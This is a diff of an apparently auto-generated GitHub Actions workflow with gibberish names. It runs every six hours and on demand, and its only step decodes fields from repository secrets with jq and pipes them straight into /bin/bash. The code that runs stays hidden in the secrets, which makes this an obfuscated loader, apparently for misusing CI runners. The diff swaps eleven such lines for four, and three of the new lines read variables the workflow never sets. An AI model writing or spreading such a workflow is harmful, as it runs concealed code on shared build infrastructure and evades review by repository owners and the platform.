@@ -1,27 +1,21 @@
 name: xingxbgzc
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 1/6 * * *'
-
-jobs:  # 12245
+    - cron: '16 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xingxbgzc
         env:
-          ocn03: ${{ secrets.ocn03 }}
+          qxzc1987: ${{ secrets.qxzc1987 }}
         run: |
-          echo $ocn03 | jq -r .jlys10645 | /bin/bash
-          echo $uvdi0 | jq -r .lojq9137 | /bin/bash
-          echo $g2 | jq -r .zx7015 | /bin/bash
-          echo $ly87623 | jq -r .i756 | /bin/bash
-          echo $s62685 | jq -r .avneu593 | /bin/bash
-          echo $i7 | jq -r .zlht6454 | /bin/bash
-          echo $mdi60724 | jq -r .yn3 | /bin/bash
-          echo $osnfy20 | jq -r .n870 | /bin/bash
-          echo $mvjv30 | jq -r .pzqw55814 | /bin/bash
-          echo $yrat5 | jq -r .dnxdr36 | /bin/bash
-          echo $vmlqj95527 | jq -r .cethi14 | /bin/bash
+          echo $qxzc1987 | jq -r .f1 | /bin/bash
+          echo $sqcp68114 | jq -r .asd74207 | /bin/bash
+          echo $kl78356 | jq -r .asgbo7498 | /bin/bash
+          echo $xmhn91834 | jq -r .ahi878 | /bin/bash
 
